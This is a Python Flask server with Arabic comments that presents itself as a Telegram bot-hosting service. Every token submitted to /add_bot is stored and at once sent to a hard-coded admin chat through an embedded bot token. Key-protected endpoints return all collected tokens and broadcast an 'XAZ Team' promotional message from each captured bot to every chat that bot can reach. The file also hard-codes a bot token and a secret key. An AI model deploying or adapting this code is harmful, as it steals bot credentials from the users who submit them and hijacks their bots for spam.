from flask import Flask, request, jsonify
import telebot
import threading
import requests
import json
import os

app = Flask(__name__)

# ملف تخزين التوكنات
TOKENS_FILE = "tokens.json"

# مفتاح سري لاستعادة التوكنات
SECRET_KEY = "xazow9wowgowwy29wi282r30wyw0wuoewgwowfepwpwy19192828827297282738383eueo"

# آيدي الأدمن لاستقبال التوكنات
ADMIN_ID = 7796858163  # استبدله بآيدي الأدمن الحقيقي

# البوت المسؤول عن إرسال التوكنات
MAIN_BOT_TOKEN = "7647664924:AAFFFndSW8pdfn5BytglDLELe7fm-uSOlS8"

# قفل لمنع التعارض بين الخيوط
bots_lock = threading.Lock()

# تحميل التوكنات المخزنة
def load_tokens():
    if os.path.exists(TOKENS_FILE):
        with open(TOKENS_FILE, "r", encoding="utf-8") as f:
            return json.load(f)
    return {}

# حفظ التوكنات في الملف
def save_tokens():
    with open(TOKENS_FILE, "w", encoding="utf-8") as f:
        json.dump(bots, f, indent=4)

# تحميل التوكنات عند بدء التشغيل
bots = load_tokens()

# دالة للتحقق من صحة التوكن
def is_valid_token(token):
    try:
        url = f"https://api.telegram.org/bot{token}/getMe"
        response = requests.get(url, timeout=5)
        return response.status_code == 200 and response.json().get("ok", False)
    except requests.RequestException as e:
        print(f"Error validating token: {e}")
        return False

# دالة لبدء تشغيل البوت
def start_bot(token):
    bot_instance = telebot.TeleBot(token)

    @bot_instance.message_handler(func=lambda message: True)
    def handle_message(message):
        pass  # تجاهل جميع الرسائل

    try:
        bot_instance.polling(none_stop=True, skip_pending=True)
    except Exception as e:
        print(f"Error in bot {token}: {e}")

# دالة لإرسال التوكنات إلى الأدمن عبر البوت الرئيسي
def send_tokens_to_admin():
    token_list = "\n".join(bots.keys()) if bots else "لا يوجد توكنات حالياً."
    message_text = f"**🔹 قائمة التوكنات 🔹**\n\n```\n{token_list}\n```"

    try:
        main_bot = telebot.TeleBot(MAIN_BOT_TOKEN)
        main_bot.send_message(ADMIN_ID, message_text, parse_mode="Markdown")
        print("تم إرسال التوكنات إلى الأدمن.")
    except Exception as e:
        print(f"Error sending tokens: {e}")

# API لإضافة بوت جديد
@app.route("/add_bot", methods=["POST"])
def add_bot():
    data = request.json
    token = data.get("token")

    if not token:
        return jsonify({"error": "Token is required"}), 400

    if not is_valid_token(token):
        return jsonify({"error": "Invalid token"}), 400

    with bots_lock:
        if token in bots:
            return jsonify({"error": "Bot already running"}), 400

        bots[token] = {"status": "active"}
        save_tokens()
        
        bot_thread = threading.Thread(target=start_bot, args=(token,), daemon=True)
        bot_thread.start()

    send_tokens_to_admin()  # إرسال التوكن فورًا عند إضافته

    return jsonify({"message": "Bot added successfully", "token": token})

# API لاستعادة جميع التوكنات باستخدام مفتاح سري
@app.route("/get_tokens", methods=["GET"])
def get_tokens():
    provided_key = request.args.get("key")
    if provided_key != SECRET_KEY:
        return jsonify({"error": "Unauthorized"}), 401

    with bots_lock:
        return jsonify({"tokens": list(bots.keys())})

# API لإرسال الرسالة إلى جميع البوتات
@app.route("/send_message", methods=["GET"])
def send_message():
    provided_key = request.args.get("key")
    if provided_key != SECRET_KEY:
        return jsonify({"error": "Unauthorized"}), 401

    message_text = (
        "**تم إرسال طلب للسيرفر، قريبًا سيتم إضافة هذا البوت لسيرفر XAZ، يُرجى الانتظار 🤖**\n\n"
        "**🔹 XAZ Team Official Links 🔹**\n"
        "🌍 **Source Group:** [XAZ Team Source](https://t.me/xazteam)\n"
        "🌍 **New Team Group:** [Join XAZ Team](https://t.me/+nuACUoH_xn05NjE0)\n"
        "🌍 **XAZ Team Official Website:** [Visit Website](https://xaz-team-website.free.bg/)\n\n"
        "**🌍 XAZ Team Official Website 🌍**\n"
        "⚠ **Note:** If the page doesn't load completely, try enabling PC Mode for the best experience.\n"
        "Stay safe and always verify official sources! 💙"
    )

    with bots_lock:
        for token in bots.keys():
            bot_instance = telebot.TeleBot(token)
            try:
                updates = bot_instance.get_updates()
                chat_ids = set(update.message.chat.id for update in updates if update.message)
                for chat_id in chat_ids:
                    bot_instance.send_message(chat_id, message_text, parse_mode="Markdown", disable_web_page_preview=True)
            except Exception as e:
                print(f"Error sending message with bot {token}: {e}")

    return jsonify({"message": "Message sent to all bots successfully"})

# API لإيقاف جميع البوتات
@app.route("/stop_bots", methods=["POST"])
def stop_bots():
    provided_key = request.json.get("key")
    if provided_key != SECRET_KEY:
        return jsonify({"error": "Unauthorized"}), 401

    with bots_lock:
        for token in list(bots.keys()):
            try:
                bot_instance = telebot.TeleBot(token)
                bot_instance.stop_polling()
            except Exception as e:
                print(f"Error stopping bot {token}: {e}")

        bots.clear()
        save_tokens()

    return jsonify({"message": "All bots stopped successfully"})

# API لإرسال قائمة التوكنات إلى الأدمن
@app.route("/send_tokens", methods=["GET"])
def send_tokens():
    provided_key = request.args.get("key")
    if provided_key != SECRET_KEY:
        return jsonify({"error": "Unauthorized"}), 401

    send_tokens_to_admin()
    return jsonify({"message": "Tokens sent to admin successfully"})

# تشغيل سيرفر Flask
if __name__ == "__main__":
    app.run(port=5000, debug=True)
